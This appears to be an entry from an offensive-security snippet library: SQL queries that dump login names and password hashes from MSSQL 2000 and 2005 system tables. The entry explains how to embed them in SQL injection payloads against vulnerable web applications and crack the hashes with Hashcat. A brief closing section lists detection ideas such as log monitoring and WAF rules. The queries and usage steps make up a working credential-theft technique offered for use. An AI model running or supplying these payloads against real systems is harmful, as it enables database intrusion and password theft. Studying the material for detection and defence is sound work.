---
id: be5c8bb9-9887-46cc-a144-c6a2ed39921f
name: mssql-credential-extraction-queries
type: code
language: sql
verified: true
created_at: '2023-04-06T03:56:33.737937+00:00'
updated_at: '2023-04-10T20:22:43.469322+00:00'
platforms:
  - Windows
tags:
  - mssql
  - sql-injection
  - credential-theft
validated: true
---

# mssql-credential-extraction-queries

## Code

```sql
MSSQL 2000:
SELECT name, password FROM master..sysxlogins
SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins (Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer.)

MSSQL 2005
SELECT name, password_hash FROM master.sys.sql_logins
SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
```

## Description

This SQL code snippet collection provides queries for extracting login credentials from MSSQL 2000 and 2005 system tables via SQL injection. It includes direct retrieval and hex conversion variants to handle varbinary storage, enabling attackers to dump and crack SQL authentication data.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | These are static queries; no variables. Adapt for injection points (e.g., UNION SELECT). | N/A |

## Usage

Embed these queries into SQL injection payloads targeting vulnerable web applications connected to MSSQL. For error-based extraction, wrap in CAST or use UNION for union-based. Once extracted, use hex outputs with Hashcat (-m 1731 for MSSQL hashes) to crack passwords. Primarily for legacy MSSQL versions where system tables are accessible.

## Detection

- Monitor SQL Server error logs for anomalous SELECT queries on master.sys.sql_logins or sysxlogins.
- Web application firewalls (WAF) rules for SQLi patterns involving fn_varbintohexstr or sysxlogins.
- Audit application logs for unexpected database queries from untrusted inputs.
- Enable SQL Profiler traces for credential-related table access.

## Related

- [[procedures/MSSQL-Credential-Theft-via-SQL-Injection]]
